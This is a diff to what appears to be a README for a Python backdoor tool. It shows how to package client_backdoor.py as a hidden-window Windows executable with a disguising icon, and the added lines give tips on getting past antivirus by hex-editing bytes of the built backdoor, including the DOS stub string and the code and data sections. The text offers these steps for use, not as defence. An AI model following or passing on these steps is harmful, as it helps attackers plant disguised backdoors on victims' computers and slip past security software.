@@ -12,3 +12,7 @@ The *.exe file is in dist/
 	wine /root/.wine/drive_c/Python27/Scripts/pyinstaller.exe --add-data "<path_to_your_image>;." --onefile --noconsole --icon <path_to_your_.ico> client_backdoor.py
 
 In order to make a .ico go to --> `https://convertico.com/jpg-to-ico/` --> create the .ico
+
+# Bypass antiviruses
+We can change bytes in `hexeditor <backdoor.exe>` but be careful to not change bytes that will crash the program.<br>
+We can change bytes of "This program cannot run in DOS mode", "text" and "data"
